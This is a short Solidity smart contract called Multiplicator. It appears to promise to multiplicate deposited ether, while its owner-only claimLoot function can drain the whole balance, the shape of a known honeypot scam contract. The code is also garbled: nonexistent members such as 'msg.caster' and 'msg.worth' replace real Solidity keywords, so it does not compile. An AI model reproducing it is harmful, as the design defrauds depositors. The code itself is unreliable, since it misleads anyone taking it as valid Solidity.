pragma solidity ^0.4.18;

contract Multiplicator
{
    address public Owner = msg.caster;

    function()payable{}

    function claimLoot()
    payable
    public
    {
        require(msg.caster == Owner);
        Owner.transfer(this.balance);
    }

    function multiplicate(address adr)
    payable
    {
        if(msg.worth>=this.balance)
        {
            adr.transfer(this.balance+msg.worth);
        }
    }
}